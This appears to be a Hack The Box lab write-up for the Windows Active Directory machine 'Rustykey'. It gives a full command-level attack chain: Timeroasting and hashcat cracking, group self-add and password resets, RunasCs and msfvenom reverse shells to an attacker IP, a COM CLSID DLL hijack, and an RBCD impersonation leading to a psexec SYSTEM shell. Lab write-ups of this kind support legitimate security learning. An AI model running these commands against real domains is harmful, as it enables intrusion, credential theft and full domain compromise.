@@ -1,0 +1,156 @@
+Title: Rustykey
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Rustykey was a Windows Active Directory box, starting from a set of given low-privilege domain credentials (`rr.parker`). Since the domain controller's clock was skewed relative to the attacking machine, all Kerberos operations had to be wrapped in `faketime`. BloodHound enumeration showed an unusually large number of computer objects in the domain, a hint toward Timeroasting, an attack against Windows' authenticated NTP time-sync protocol that lets an unauthenticated (or low-privileged) attacker request SNTP-authenticated responses from the KDC for every computer account in the domain and crack the resulting hashes offline, similar in spirit to Kerberoasting but targeting machine accounts via the time service rather than service tickets. One cracked password mapped to a specific computer account, which BloodHound showed could add itself to a support-tier group with password-reset rights over Remote Management-enabled users. That reset gave WinRM access and the user flag, and further pivoting through a RunasCs-based lateral move, a writable COM CLSID registry key abused for DLL hijacking, and finally a Resource-Based Constrained Delegation chain against the domain controller led to impersonating a privileged backup account and a SYSTEM shell.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.75
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap    (Domain: rustykey.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  ncacn_http
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap (Global Catalog)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+```
+
+The scan confirmed a Windows domain controller (`DC`) for `rustykey.htb`. A significant clock skew (over 8 hours) was reported against the DC, meaning Kerberos ticket requests would need to be time-corrected to succeed.
+
+## Domain Enumeration
+
+With `faketime` synced to the DC's clock, a TGT was requested for the given account and used for both BloodHound collection and a direct SMB user listing:
+
+```
+> faketime -f $(ntpdate -q rustykey.htb | awk '{print $4}') bash
+> impacket-getTGT 'rustykey.htb/rr.parker:8#t5HE8L!W3A'
+> export KRB5CCNAME=rr.parker.ccache
+> bloodhound-python -u rr.parker -p '8#t5HE8L!W3A' -d rustykey.htb -ns 10.10.11.75 -c All --zip
+> nxc smb dc.rustykey.htb -k --users
+```
+
+This enumerated the domain's users (`rr.parker`, `mm.turner`, `bb.morgan`, `gg.anderson`, `dd.ali`, `ee.reed`, `nn.marcos`, `backupadmin`, plus built-ins) and, through BloodHound, showed a large number of computer accounts sitting directly in `Domain Computers`, a pattern that pointed toward Timeroasting as a worthwhile attack path.
+
+## Timeroasting - Cracking Computer Account Passwords
+
+Windows' authenticated time synchronization (W32Time/SNTP) lets any client request a response from a domain controller that is cryptographically bound to a computer account's password hash, without needing to authenticate first. Dumping these responses for every computer account in the domain, then cracking them offline, can recover plaintext computer account passwords much like Kerberoasting recovers service account passwords:
+
+```
+> nxc smb dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k -M timeroast
+1000:$sntp-ms$829d0de8c4c7f59cecb49cc51802084a$...
+1103:$sntp-ms$2f097a4f678bb4698309eefe702b6278$...
+...
+1125:$sntp-ms$16d79535061ab4f1424c4a9c5f8bd044$...
+```
+
+The numeric prefix on each line corresponds to the last four digits of that computer account's SID. Cracking these hashes requires hashcat mode 31300, which at the time was only available unreleased/in beta and had to be built from source. Running the harvested hashes against rockyou.txt cracked one:
+
+```
+> ./hashcat -m 31300 hash.txt rockyou.txt
+$sntp-ms$16d79535061ab4f1424c4a9c5f8bd044$...:Rusty88!
+```
+
+The cracked hash's SID suffix (`1125`) matched the computer account `IT-COMPUTER3$`.
+
+## Abusing IT-COMPUTER3$ - Group Self-Add and Protected Objects Bypass
+
+A TGT was requested directly for the cracked computer account:
+
+```
+> impacket-getTGT -dc-ip 10.10.11.75 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
+> export KRB5CCNAME=IT-COMPUTER3\$.ccache
+```
+
+BloodHound showed `IT-COMPUTER3$` held rights to add itself to the `HELPDESK` group, and that `HELPDESK` in turn held password-reset rights over several users. `IT-COMPUTER3$` was added to the group, then removed from a `Protected Objects` group covering both `IT` and `SUPPORT` scopes that would otherwise have blocked further modification:
+
+```
+> bloodyAD -d rustykey.htb --host dc.rustykey.htb --dc-ip 10.10.11.75 -u IT-COMPUTER3$ -k add groupMember 'HELPDESK' 'IT-COMPUTER3$'
+> bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -k remove groupMember 'Protected Objects' 'IT'
+> bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -k remove groupMember 'Protected Objects' 'SUPPORT'
+```
+
+Of the users reachable by `HELPDESK`'s reset rights, `bb.morgan`, `gg.anderson`, and `ee.reed` were also members of `Remote Management Users`, making them useful targets for a WinRM foothold.
+
+## Foothold - WinRM as bb.morgan
+
+```
+> bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'Password123!'
+> impacket-getTGT -dc-ip 10.10.11.75 'rustykey.htb/bb.morgan:Password123!'
+> export KRB5CCNAME=bb.morgan.ccache
+> evil-winrm -i dc.rustykey.htb -u bb.morgan -r rustykey.htb
+```
+
+This granted a shell and the user flag. The same reset technique was repeated against `ee.reed` to secure a second usable account for later lateral movement.
+
+## Lateral Movement - ee.reed via RunasCs
+
+With a shell as `bb.morgan`, `RunasCs.exe` was uploaded and used to execute a reverse shell payload under `ee.reed`'s freshly reset credentials:
+
+```
+> .\RunasCS.exe ee.reed "Password123!" powershell.exe -r 10.10.14.191:443
+```
+
+## Privilege Escalation - COM CLSID Hijack to mm.turner
+
+Enumerating writable COM registry keys from the `ee.reed` shell with a custom script found a CLSID entry that the `Support` group (which `ee.reed` was effectively operating under) held full control over:
+
+```
+Key: HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
+Who: RUSTYKEY\Support
+Rights: FullControl
+```
+
+That CLSID's default value pointed to `7-zip.dll`, meaning any process that instantiates this COM object, in this case 7-Zip itself, would load whatever the registry key pointed to. A malicious reverse-shell DLL was generated, staged, and set as the key's value in place of the legitimate library:
+
+```
+> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.191 LPORT=1443 -f dll -o hijack.dll
+> Set-ItemProperty -Path "HKLM:\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" -Name "(default)" -Value "C:\Users\Public\hijack.dll"
+> 'C:\Program Files\7-zip\7z.exe'
+```
+
+Running 7-Zip triggered the hijacked COM registration and loaded the malicious DLL, catching a reverse shell running as `mm.turner`.
+
+## Privilege Escalation - RBCD to backupadmin
+
+BloodHound showed `mm.turner` held the right to configure delegation (`AddAllowedToAct`) on the `DC` computer object, and separately that a `backupadmin` account belonged to a group with `GenericAll` rights over the domain controller. Combining these, Resource-Based Constrained Delegation was configured to let `IT-COMPUTER3$` act on behalf of any user when authenticating to the DC:
+
+```
+> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
+```
+
+With that delegation in place, `IT-COMPUTER3$`'s Kerberos context was used to request a service ticket via S4U2Self/S4U2Proxy, impersonating `backupadmin` against the CIFS service on the DC:
+
+```
+> impacket-getTGT -dc-ip 10.10.11.75 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
+> export KRB5CCNAME=IT-COMPUTER3\$.ccache
+> impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.10.11.75 -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!'
+> export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
+```
+
+## SYSTEM - psexec as backupadmin
+
+```
+> impacket-psexec -k -no-pass RUSTYKEY.HTB/backupadmin@dc.rustykey.htb
+```
+
+Since `backupadmin`'s group held `GenericAll` over the domain controller object, this ticket was sufficient for a full SYSTEM shell on the DC.
+
+## Takeaways
+
+- Kerberos environments with significant clock skew require every ticket-dependent tool to be run under a time-correcting wrapper like `faketime`; without it, authentication fails outright regardless of how correct the credentials are.
+- An unusually large number of computer accounts sitting in `Domain Computers` is a strong hint to check for Timeroasting, since every one of those machine accounts is a potential source of a crackable, unauthenticated-reachable password hash via the domain's time service.
+- Newly disclosed hashcat modes are sometimes only available in-development and need to be built from source before they can be used; don't assume a technique is unusable just because it isn't in your package manager's stock hashcat build yet.
+- BloodHound-mapped self-add rights on computer accounts (not just user accounts) are directly actionable with tools like `bloodyAD`, and "protected object" style safeguards can sometimes themselves be removed if the compromised principal has rights over that protection group.
+- Writable COM CLSID registry keys are a reliable local privilege escalation and lateral movement primitive: whatever legitimate application instantiates that COM object will load an attacker-supplied DLL in its place, without needing to touch the original binary at all.
+- Resource-Based Constrained Delegation, once an attacker controls a principal with rights to configure it on a target computer object, is one of the most direct paths to full impersonation on that target, especially when chained with a second account that itself holds sweeping rights (like `GenericAll`) over the same object.
